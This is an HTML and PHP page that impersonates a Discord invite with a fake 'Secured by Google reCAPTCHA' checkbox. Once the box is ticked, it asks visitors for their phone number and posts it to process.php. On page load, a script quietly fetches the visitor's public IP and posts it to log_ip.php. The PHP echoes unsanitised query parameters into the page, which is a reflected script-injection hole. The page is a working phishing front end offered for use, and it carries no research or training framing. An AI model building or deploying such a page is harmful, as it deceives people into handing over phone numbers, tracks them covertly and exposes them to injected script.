<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Invite</title>
    <style>
        body {
            background-color: #23272a;
            color: #dcddde;
            font-family: 'Roboto', sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }

        .header {
            width: 100%;
            padding: 20px;
            background-color: #2f3136;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 1px 0 rgba(0, 0, 0, 0.2);
            border-bottom: 1px solid #4f545c;
            position: absolute;
            top: 0;
        }

        .header img {
            width: 120px; /* Adjust the logo size */
        }

        .verification-container {
            background-color: #40444b;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
            width: 90%;
            max-width: 400px;
            text-align: center;
            margin-top: 80px; /* Adjust top margin to account for the header */
        }

        .verification-container h1 {
            font-size: 24px;
            margin-bottom: 15px;
            color: #ffffff;
        }

        .verification-container p {
            font-size: 16px;
            color: #b9bbbe;
            margin-bottom: 20px;
        }

        .checkbox-container {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
        }

        .checkbox-container label {
            font-size: 16px;
            color: #b9bbbe;
            display: flex;
            align-items: center;
        }

        .checkbox-container input[type="checkbox"] {
            margin-right: 10px;
            transform: scale(1.5); /* Make checkbox larger */
        }

        .recaptcha-text {
            display: flex;
            align-items: center;
            justify-content: center;
            color: #b9bbbe;
            font-size: 12px;
        }

        .recaptcha-text img {
            margin-right: 10px;
            width: 20px;
        }

        .phone-form {
            display: none;
            margin-top: 20px;
        }

        .phone-form.show {
            display: block;
        }

        select, input[type="text"] {
            padding: 12px;
            font-size: 16px;
            border: 1px solid #72767d;
            border-radius: 4px;
            width: 100%;
            box-sizing: border-box;
            margin-bottom: 10px;
            background-color: #2f3136;
            color: #dcddde;
        }

        button {
            background-color: #7289da;
            color: white;
            padding: 12px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            width: 100%;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #5b6eae;
        }

        #errorMessage {
            color: #f04747;
            margin-top: 10px;
            display: none;
        }

        /* Mobile-specific styles */
        @media (max-width: 600px) {
            .header img {
                width: 100px; /* Smaller logo on mobile */
            }

            .verification-container {
                width: 95%;
                padding: 20px;
            }

            .verification-container h1 {
                font-size: 22px;
            }

            .input-group {
                margin: 10px 0;
            }

            button {
                font-size: 14px;
                padding: 10px;
            }
        }
    </style>
</head>
<body>

    <div class="header">
        <img src="DiscordLogo.png" alt="Discord Logo">
    </div>

    <div class="verification-container">
        <h1>Hold up! Are you human?</h1>
        <div class="checkbox-container">
            <label>
                <input type="checkbox" id="humanCheck">
                <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" alt="Google Logo">
                <span style="margin-left: 8px;">Secured by Google reCAPTCHA.</span>
            </label>
        </div>

        <div class="phone-form">
            <p>Please enter your phone number to verify your identity.</p>
            <p>A verification code will be sent to your phone.</p>
            <form action="process.php" method="POST">
                <div class="input-group">
                    <select name="countryCode" id="countryCode">
                        <option value="+1">+1 (USA)</option>
						<option value="+44">+44 (UK)</option>
						<option value="+91">+91 (India)</option>
						<option value="+61">+61 (Australia)</option>
						<option value="+81">+81 (Japan)</option>
						<option value="+49">+49 (Germany)</option>
						<option value="+33">+33 (France)</option>
						<option value="+34">+34 (Spain)</option>
						<option value="+39">+39 (Italy)</option>
						<option value="+86">+86 (China)</option>
						<option value="+7">+7 (Russia)</option>
						<option value="+55">+55 (Brazil)</option>
						<option value="+27">+27 (South Africa)</option>
						<option value="+64">+64 (New Zealand)</option>
						<option value="+66">+66 (Thailand)</option>
						<option value="+90">+90 (Turkey)</option>
						<option value="+92">+92 (Pakistan)</option>
						<option value="+34">+34 (Mexico)</option>
						<option value="+62">+62 (Indonesia)</option>
						<option value="+351">+351 (Portugal)</option>
						<option value="+52">+52 (Mexico)</option>
						<option value="+48">+48 (Poland)</option>
						<option value="+82">+82 (South Korea)</option>
                        <!-- Add other country codes here -->
                    </select>
                    <input type="text" name="phoneNumber" id="phoneNumber" placeholder="Phone Number">
                </div>
                <button type="submit" id="submitPhoneNumber">Verify</button>
            </form>
            <?php
            if (isset($_GET['error'])) {
                echo "<p id='errorMessage' style='display: block;'>{$_GET['error']}</p>";
            } elseif (isset($_GET['success'])) {
                echo "<p id='errorMessage' style='display: block;'>{$_GET['success']}</p>";
            }
            ?>
        </div>
    </div>

    <script>
        document.getElementById('humanCheck').addEventListener('change', function() {
            var phoneForm = document.querySelector('.phone-form');
            phoneForm.classList.toggle('show', this.checked);
        });

        // JavaScript for logging IP when the page loads
        fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const userIP = data.ip;

            // Send the IP to log_ip.php for logging
            const xhr = new XMLHttpRequest();
            xhr.open("POST", "log_ip.php", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.send("ip=" + userIP);
        })
        .catch(error => {
            console.error("Error fetching IP address:", error);
        });
    </script>

</body>
</html>
